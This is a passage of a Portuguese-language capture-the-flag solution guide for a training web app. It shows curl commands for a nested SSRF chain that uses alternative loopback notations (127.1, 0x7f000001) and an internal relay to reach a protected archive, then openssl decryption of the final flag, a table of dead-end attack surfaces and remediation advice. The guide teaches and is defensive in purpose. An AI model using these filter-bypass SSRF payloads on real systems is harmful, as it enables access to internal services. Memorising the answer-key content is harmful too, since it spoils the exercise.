  -d '{"url_webhook":"http://127.1:8088/"}'
```

O conector não guarda dado nenhum. Ele te diz três coisas: o **lote de
conciliação corrente**, o endereço do arquivo (`127.0.0.1:9203/conciliacao`, com
os parâmetros `batch` e `key`) e que o acesso é *"somente por encaminhamento
deste conector"*. E nomeia os dois endpoints:
`/internal/catalog/handoff` (emite a chave de sessão, validade 300 s) e
`/relay?destino=<url>`.

O mesmo lote também sai da flag 5 (o 422 da importação de CSV) e da flag 12
(`conciliacao.lote_corrente` na `platform_secrets`). São três caminhos para o
mesmo dado.

**A chave.** Ainda pelo diagnóstico, ainda com a notação do estágio 1:

```bash
curl -s -b "$JAR" -X POST "$ATR/api/operador/diagnostico" \
  -H 'content-type: application/json' \
  -d '{"url_webhook":"http://127.1:8088/internal/catalog/handoff"}'
```

**Por que não dá para chamar o `:9203` direto.** Se você tentar, o arquivo
devolve `403 chamada_nao_encaminhada`: ele só atende quem traz o cabeçalho
`X-Atr-Relay` válido, e só o relay o põe. É aí que a cadeia deixa de ser um SSRF
simples e vira **pivô aninhado** — um SSRF de dentro do SSRF, em que o
encaminhador é ele mesmo um alvo.

**Estágio 2 — o arquivo, pelo relay.** Duas notações **diferentes** na mesma
requisição: a do diagnóstico para chegar no `:8088`, a do relay para chegar no
`:9203`.

```bash
curl -s -b "$JAR" -X POST "$ATR/api/operador/diagnostico" \
  -H 'content-type: application/json' \
  -d '{"url_webhook":"http://127.1:8088/relay?destino=http://0x7f000001:9203/conciliacao%3Fbatch=<lote>%26key=<chave>"}'
```

### URL dentro de URL

O `destino=` carrega uma URL inteira, com query string própria. O `&` de dentro
**precisa** ir percent-encoded como `%26`; se não for, o relay lê `key=` como
parâmetro **dele**, o destino chega sem a chave, e o estágio 2 responde
`chave_ausente` — a chave existia e simplesmente não chegou. Encodar o `?`
interno como `%3F` também é seguro e evita ambiguidade.

O campo `encaminhado_para` da resposta mostra a URL que o relay de fato montou.
É o seu diagnóstico: se ela chegou truncada, foi encoding.

### A recusa é sempre a mesma

Qualquer destino barrado — literal, faixa privada, rede do Docker, metadados,
notação não aceita, esquema inválido — devolve o mesmo
`{"erro":"destino_recusado","mensagem":"destino bloqueado"}`. O motivo interno da recusa fica no log do contêiner. Durante a avaliação,
esse log era acessível ao instrutor; no pacote local, você pode consultá-lo
com `docker logs atrium`. Isso é deliberado: dizer qual regra pegou
seria ensinar a blocklist por sondagem.

O sinal que você tem é a **diferença de resultado entre duas tentativas**, nunca
o texto do erro. Mude uma coisa por vez e compare as respostas para identificar
quais notações cada filtro aceita.

### Janela de tempo

A chave do handoff muda em janelas de 300 segundos. Consulte o handoff pouco
antes de usá-la e peça uma nova se a janela mudar. O lote de conciliação e os
fragmentos do cofre permanecem os mesmos naquela imagem.

### O que sai do estágio 2

Registros de faturamento sintéticos, a `chave_recuperacao` (a flag 22), o
**fragmento do cofre** e o `PROCEDIMENTO-COFRE.txt` — o documento que diz a ordem
dos cinco selos e a derivação da chave.

### A lição

Três coisas, e a terceira é a que separa:

1. O filtro é **textual**, e por isso uma notação alternativa de loopback passa.
2. O pivô é **aninhado**: o alvo final só aceita chamadas encaminhadas, e o
   encaminhador é ele mesmo um alvo de SSRF.
3. Os dois filtros **não têm interseção**, e descobrir isso exigiu testar uma
   segunda notação. Quem diz "usei a mesma notação nos dois" não fez o segundo
   estágio — a resposta o teria bloqueado.

A correção é validar o destino resolvido. Faça o parse da URL,
resolva o hostname, valide **todos** os endereços resolvidos contra uma allowlist
de destino, e conecte no IP validado — que é, aliás, exatamente o que a camada 2
faz e a camada 1 não.

---

## Flag final — o cofre de recuperação

`encadeamento` · 16 pontos · exige os cinco fragmentos, na ordem certa

### O desenho

Cinco flags entregam, além do valor, um **selo de 6 caracteres**: as flags
**5, 8, 12, 15 e 22** — uma de cada nível, de propósito, para que a final exija
abrangência e profundidade ao mesmo tempo.

Ter os cinco não basta. Eles são material de chave, e a chave só existe na ordem
certa. A ordem é sorteada por semente e está no `PROCEDIMENTO-COFRE.txt`, obtido no estágio 2 do SSRF pelo percurso da aplicação.

### O envelope

```bash
curl -s -b "$JAR" "$ATR/api/operador/cofre"
```

```json
{"formato":"atrium-cofre/1","cifra":"aes-256-cbc",
 "derivacao_da_chave":"sha-256 da concatenação dos selos, na ordem do procedimento…",
 "iv":"<32 hex>","conteudo":"<base64>",
 "procedimento":"arquivado junto ao arquivo de conciliação do conector de integração"}
```

Não há tela para isso. O console do operador não tem cartão de cofre nem link, e
não poderia ter: anunciar a estrutura da flag final para quem ainda não chegou ao
fim da cadeia entregaria o desenho. O endereço do envelope e o procedimento de
derivação da chave são apresentados no `PROCEDIMENTO-COFRE.txt`.

### O valor sai de decifrar na sua máquina

> **A chave não é armazenada em lugar nenhum.** O servidor a *deriva* dos cinco
> selos para cifrar o envelope, e você a deriva dos mesmos cinco selos para
> abri-lo. Não existe um endpoint de tentativa de abertura, e por isso não existe
> oráculo — o cofre não tem como dizer "quase".

```bash
CHAVE=$(printf '%s' '<selo1><selo2><selo3><selo4><selo5>' | openssl dgst -sha256 | awk '{print $NF}')
echo '<conteudo em base64>' | base64 -d > envelope.bin
openssl enc -d -aes-256-cbc -K "$CHAVE" -iv "<iv em hex>" -in envelope.bin
# OCEAN{FF-...}
```

Concatenação **direta, sem separador**, na ordem do procedimento. AES-256-CBC com
preenchimento PKCS#7 padrão — o `openssl` do próprio container abre. Uma chave
errada normalmente produz `bad decrypt`; e mesmo que o padding seja aceito por
acaso, você precisa conferir se o texto decifrado é uma flag válida no formato
`OCEAN{FF-<12 hex>}`.

O endpoint aceita a consulta do envelope por GET. A decifragem acontece
localmente: não há uma operação POST para enviar a chave e conferir a resposta.

### A lição

Distinga três coisas que se confundem com facilidade: **onde a chave é
armazenada** (em lugar nenhum), **como ela é
derivada** (SHA-256 da concatenação ordenada dos selos) e **a ausência de um
oráculo HTTP** (que é uma decisão de interface, não uma propriedade da
criptografia). Um esquema de recuperação que deriva a chave de segredos
distribuídos por subsistemas diferentes é uma boa ideia; o que o laboratório
demonstra é o que acontece quando cada um desses subsistemas vaza o seu pedaço.

---

## Rabbit holes

Estas oito superfícies sugerem caminhos de exploração, mas não entregam flags.
Confira as respostas e o estado da aplicação para avaliar cada hipótese.

Por exemplo: ao testar mass assignment no `PATCH /api/perfil`, a resposta é
200, mas o papel permanece igual quando você confere o perfil depois. O código
de status, sozinho, não demonstra que a alteração foi aplicada.

| Superfície | O que se tenta | O que acontece |
|---|---|---|
| Tabela `flags`, pela SQLi | dump direto | só placeholders (`reservado`, `migrado`, hashes truncados). O valor real está em `platform_secrets` — quem para no primeiro achado sai sem nada |
| `/backup/`, citado no `robots.txt` | arquivo esquecido | 403 sempre, e a resposta explica que a área foi desativada em 2025; o diretório não existe |
| `/security.txt` na raiz | flag duplicada fora do `.well-known` | só contato, e avisa que não é o local canônico, sem dizer qual é |
| `PATCH /api/perfil` com `papel`/`role`/`org_id`/`plano` | mass assignment | 200, e ignora em silêncio — só olhando o perfil depois se percebe |
| `POST /api/perfil/avatar` | SSRF pelo avatar por URL | allowlist rígida de hostname (`cdn.eventosatrium.com` e `avatares.eventosatrium.com`) e exigência de HTTPS, comparados por **igualdade**. Contraste direto com o filtro textual da flag 22 |
| `debugInfo` no GraphQL | vazamento administrativo | devolve só dado já público: versão, commit, nome do evento |
| `/painel/auditoria` | histórico de ações | mostra os 120 registros mais recentes de uma base com 800 registros sintéticos, sem valores de flags |
| Convite de co-organizador (flag 8) | forjar `papel` por esse tipo de convite | 422 dizendo que a política é avaliada **por tipo de convite**. Fecha bem: você conclui que o tipo é validado e testa o outro, que é o que funciona |

### Telas sem flag

Estas existem para impedir que você deduza o mapa da prova pela navegação. Se
uma tela parece rica demais para não ter nada, ela provavelmente é uma delas:

`/programacao`, `/palestrantes`, `/salas`, `/eventos`, `/lista-espera`,
`/politica-reembolso` (que descreve a regra quebrada pela flag 13),
`/ajuda` (que dá pistas legítimas sobre voluntariado e sobre a reserva),
`/meus-ingressos`, `/credenciamento` (a tela não tem flag; o **bundle** dela
revela o endpoint `/graphql`), `/painel/lotes`, `/painel/repasses`
(exceto em D e H, onde é a tela da SQLi), `/painel/webhooks`,
`/painel/comunicados`, `/plataforma/organizacoes`, `/plataforma/metricas`.

### Um caso ambíguo que vale saber

A tela `/painel/cupons` é a tela da SQL injection nas variantes **C** e **G**.
Nas outras seis, o mesmo parâmetro `order` é validado por allowlist; valores
fora dela são ignorados e a consulta usa a ordenação padrão.

Então: se você é da variante A e verificou que a ordenação dos cupons é validada
corretamente, você está certo e testou o lugar certo. Duas pessoas testando a
mesma tela e chegando a conclusões opostas não é sinal de que uma errou — é sinal
de que as instâncias são diferentes, que é exatamente o desenho desta atividade.
